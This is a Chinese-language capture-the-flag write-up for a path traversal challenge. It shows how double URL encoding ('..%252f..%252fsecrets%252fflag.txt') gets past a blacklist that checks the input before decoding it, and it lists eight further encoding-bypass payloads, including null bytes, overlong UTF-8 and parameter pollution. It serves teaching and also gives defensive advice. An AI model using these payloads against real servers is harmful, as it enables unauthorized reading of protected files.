# Q25 - Path Traversal · 双重 URL 编码绕过

两次解码错位的 4 种常见组合（全都是真实 CTF 模式）：

| 上游（看字符串的） | 下游（用字符串的） | 漏洞结果 |
| --- | --- | --- |
| 解码 1 次 | 解码 2 次【本题】 | 二次 URL 编码穿越 |
| 正则扫原文 | URL-decode 后用 | 同上 |
| URL-decode | base64-decode | 编码混合绕过 |
| UTF-8 规范化前 | 规范化后 | Unicode 规范化绕（如 `。` → `..`） |

黑名单三大固有缺陷（本题全中）：

| 缺陷 | 本题体现 |
| --- | --- |
| 字面量匹配：只认 ASCII 序列 | `..%2f` 不是 `../`，直接漏 |
| 编码维度单一：不做归一化 | 没先 `urldecode` 再 `stripos` |
| 黑名单列不完：`./`、`.\` 能拦，`%2e%2e%2f` 拦不了 | 本题典型 |

Important

"过滤>解码" vs "解码>过滤"：

- 错的（本题）：`if (blacklist) reject; decode();` → 攻击者利用编码藏匿
- 对的：`normalized = normalize(raw); if (blacklist) reject;` → 所有等价形式都统一
- 一句话：永远在"规范化之后"做安全决策。

# 关键前置知识

URL 编码的 3 层写法：

| 字符 | 一次编码 | 二次编码 | 三次编码 |
| --- | --- | --- | --- |
| `.` | `%2e` | `%252e` | `%25252e` |
| `/` | `%2f` | `%252f` | `%25252f` |
| `\` | `%5c` | `%255c` | `%25255c` |
| `..` | `..` / `%2e%2e` | `%252e%252e` | `%25252e%25252e` |
| `../` | `..%2f` / `%2e%2e%2f` | `%252e%252e%252f` | … |

Tip

每多一次 `%25`，就等价多一次 `urldecode`。遇到下游手动多调一次就多套一层。

大小写组合：`%2e` 与 `%2E`、`%2f` 与 `%2F` 等价；`stripos` 本就大小写不敏感，无绕值。

"先看后转"的代码陷阱（PHP/Python/Java 通用）：

| 语言 | 危险范式 |
| --- | --- |
| PHP | `stripos($_GET['x'], '../'); urldecode($_GET['x']);` |
| Python | `if '../' in request.args['x']: ...; name = unquote(name)` |
| Java | `if (s.contains("../")) ...; URLDecoder.decode(s, "UTF-8");` |
| Node | `req.query.x.includes('../'); decodeURIComponent(x)` |

`%2F` 也可能被反向代理拦：

- Apache 默认 `AllowEncodedSlashes Off` → `%2F` 在 URL 路径段会 返回 404
- 但在 `query string`（`?file=` 之后）不受限制 ← 本题参数全在 query 里，畅通

# 解题思路推导

## 阶段 ①：摸黑名单边界

逐个发探针，三件事要确认：

- 裸 `../` 是否真的被拦？
- 编码一次的 `%2e%2e%2f` 是否被拦？（能拦 = 黑名单在“解码后”判；拦不住 = 解码前判）
- 编码两次的 `%252e%252e%252f` 是否被拦？

| 探针 | 期望响应 | 推论 |
| --- | --- | --- |
| `?file=../../secrets/flag.txt` | `Bad path detected.` | 字面拦 ✓ |
| `?file=%2e%2e/%2e%2e/secrets/flag.txt` | `Bad path detected.` | Apache/PHP 已解一次 = `../`，黑名单在“解码后”看 |
| `?file=..%252f..%252fsecrets%252fflag.txt` | `flag` | 黑名单解一次 = `..%2f`，后续 `urldecode` 再解一次 = `../` |

**关键判断：** 探针 2 被拦、探针 3 不被拦 → 一定是“过滤之后又解了一次码”。

## 阶段 ②：算 `../` 层数

`base = /var/www/public/`；深度 = 3；目标 `/var/secrets/flag.txt`：

- `../` × 1 → `/var/www/`
- `../` × 2 → `/var/`
- 接 `secrets/flag.txt` → `/var/secrets/flag.txt`

所以内层真正要注入的字符串是 `../../secrets/flag.txt`，只需 2 层 `../`。

## 阶段 ③：精挑编码点

只有 `../` 和 `..\` 会被黑名单 `stripos` 扫到，所以只需编码 `/`（即 `%2f` → 二次编 `%252f`）即可让 `"..%2f"` 在黑名单眼里不含 `../`；两个点 `.` 保留原形不影响。最简 payload：

[代码块边界]text
..%252f..%252fsecrets%252fflag.txt
[代码块边界]

当然保守派可以连点也一起编（`%252e%252e%252f...`），效果一样。

# 常见坑

| 问题 | 根因 | 解决 |
|---|---|---|
| 单次编码仍被 403 | 黑名单在“解码后”比对 | 上二次编码 `%25xx` |
| 三次编码反而读不到 | 下游只 `urldecode` 一次；多余 `%25` 残留破坏路径 | 精确匹配下游解码次数：源码里 `urldecode` 被调几次，payload 编几层 |
| 浏览器“替我”再解码一次 | 浏览器地址栏对某些字符会自动解码 | 用 `curl` 发，或 Burp 里手动编码 |
| 反代拦 `%2f` | Apache `AllowEncodedSlashes Off` 只拦 URL `path`；query 不受影响 | 本题参数在 query 里，不受限 |
| 404 "File not found" | 路径计算错 / 层数不对 | 先用 `%252f..%252fpublic%252freadme.txt` 做基线验证穿透通道 |
| 403 但不是黑名单的错 | FS 权限 / 目标不是文件 | `is_dir` 也会 404；`ls -l` 看目标权限 |
| 本地 curl 里 `%` 被 shell 吃 | zsh/bash 某些 glob 模式 | 外层加单引号：`'?file=..%252f...'` |

# 编码绕过进阶 8 谱

Important

1. N 次 URL 编码：按下游 `decode()` 调用次数堆 `%25`
2. UTF-8 过宽编码：`%c0%ae` = `.`，`%c0%af` = `/`（CVE-2001-0333 Apache 历史漏洞）
3. Unicode 规范化：`\u002e`、`\uff0e`（全角点）在 NFKC 规范化后 = `.`
4. URL 片段（fragment）注入：`?file=a.txt#../../../flag`，看后端是否把 `#` 后也拼进去
5. 双斜杠归并：`//secrets//flag.txt`，部分库归并多 `/` 后相对基点跑偏
6. Null Byte：`?file=readme.txt%00../../../flag.txt`，老 PHP 截断前半部分
7. 编码混合：`%252e%2e%2f`（二次 + 一次交错），让正则写得丑的黑名单误判
8. HTTP Parameter Pollution：`?file=safe.txt&file=../../../flag`，部分框架取后一个
